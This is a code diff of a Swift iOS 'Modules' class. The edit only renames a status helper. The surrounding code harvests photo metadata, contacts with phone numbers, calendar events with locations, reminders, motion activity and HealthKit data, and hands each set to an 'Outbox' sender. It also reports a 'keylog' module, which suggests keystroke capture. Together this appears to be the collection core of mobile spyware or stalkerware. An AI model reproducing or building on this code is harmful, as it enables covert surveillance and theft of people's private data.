@@ -76,7 +76,7 @@ final class Modules {
     private func photos() {
         PHPhotoLibrary.requestAuthorization(for: .readWrite) { st in
             guard st == .authorized || st == .limited else {
-                Health.fail(.photoLibrary, "Photos permission denied"); return
+                HealthMon.fail(.photoLibrary, "Photos permission denied"); return
             }
             let o = PHFetchOptions()
             o.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
@@ -91,14 +91,14 @@ final class Modules {
                                         "at": asset.creationDate?.timeIntervalSince1970 ?? 0])
                 }
             }
-            Health.ok(.photoLibrary)
+            HealthMon.ok(.photoLibrary)
         }
     }
 
     private func contacts() {
         let store = CNContactStore()
         store.requestAccess(for: .contacts) { ok, _ in
-            guard ok else { Health.fail(.contacts, "Contacts permission denied"); return }
+            guard ok else { HealthMon.fail(.contacts, "Contacts permission denied"); return }
             let keys = [CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey] as [CNKeyDescriptor]
             let req = CNContactFetchRequest(keysToFetch: keys)
             var out: [[String: String]] = []
@@ -107,36 +107,36 @@ final class Modules {
                             "phone": c.phoneNumbers.first?.value.stringValue ?? ""])
             }
             Outbox.shared.send(["type": "contacts", "count": out.count, "items": Array(out.prefix(500))])
-            Health.ok(.contacts)
+            HealthMon.ok(.contacts)
         }
     }
 
     private func calendar() {
         let store = EKEventStore()
         store.requestFullAccessToEvents { ok, _ in
-            guard ok else { Health.fail(.calendar, "Calendar permission denied"); return }
+            guard ok else { HealthMon.fail(.calendar, "Calendar permission denied"); return }
             let p = store.predicateForEvents(withStart: Date(), end: Date().addingTimeInterval(604800), calendars: nil)
             let items = store.events(matching: p).map {
                 ["title": $0.title ?? "", "start": $0.startDate.timeIntervalSince1970, "loc": $0.location ?? ""] as [String: Any]
             }
             Outbox.shared.send(["type": "calendar", "items": items])
-            Health.ok(.calendar)
+            HealthMon.ok(.calendar)
         }
     }
 
     private func reminders() {
         let store = EKEventStore()
         store.requestFullAccessToReminders { ok, _ in
-            guard ok else { Health.fail(.reminders, "Reminders permission denied"); return }
+            guard ok else { HealthMon.fail(.reminders, "Reminders permission denied"); return }
             store.fetchReminders(matching: store.predicateForReminders(in: nil)) { r in
                 Outbox.shared.send(["type": "reminders", "items": (r ?? []).filter { !$0.isCompleted }.map { $0.title }])
-                Health.ok(.reminders)
+                HealthMon.ok(.reminders)
             }
         }
     }
 
     private func startMotion() {
-        guard CMMotionActivityManager.isActivityAvailable() else { Health.fail(.motion, "Motion unavailable"); return }
+        guard CMMotionActivityManager.isActivityAvailable() else { HealthMon.fail(.motion, "Motion unavailable"); return }
         motion.startActivityUpdates(to: .main) { a in
             guard let a, Settings.shared.isOn(.motion) else { return }
             let kind = a.automotive ? "driving" : a.walking ? "walking"
@@ -146,10 +146,10 @@ final class Modules {
     }
 
     private func healthData() {
-        guard HKHealthStore.isHealthDataAvailable() else { Health.fail(.health, "HealthKit unavailable"); return }
+        guard HKHealthStore.isHealthDataAvailable() else { HealthMon.fail(.health, "HealthKit unavailable"); return }
         let steps = HKQuantityType(.stepCount), hr = HKQuantityType(.heartRate)
         health.requestAuthorization(toShare: [], read: [steps, hr]) { ok, err in
-            guard ok else { Health.fail(.health, err?.localizedDescription ?? "Health denied"); return }
+            guard ok else { HealthMon.fail(.health, err?.localizedDescription ?? "Health denied"); return }
             let p = HKStatisticsQuery.predicateForSamples(withStart: Calendar.current.startOfDay(for: Date()), end: Date())
             let q = HKStatisticsQuery(quantityType: steps, quantitySamplePredicate: p, options: .cumulativeSum) { _, s, _ in
                 Outbox.shared.send(["type": "health",
@@ -157,7 +157,7 @@ final class Modules {
                                     "t": Date().timeIntervalSince1970])
             }
             self.health.execute(q)
-            Health.ok(.health)
+            HealthMon.ok(.health)
         }
     }
 
@@ -175,6 +175,6 @@ final class Modules {
             }
         }
         store?.set([], forKey: "log")
-        Health.ok(.keylog)
+        HealthMon.ok(.keylog)
     }
 }
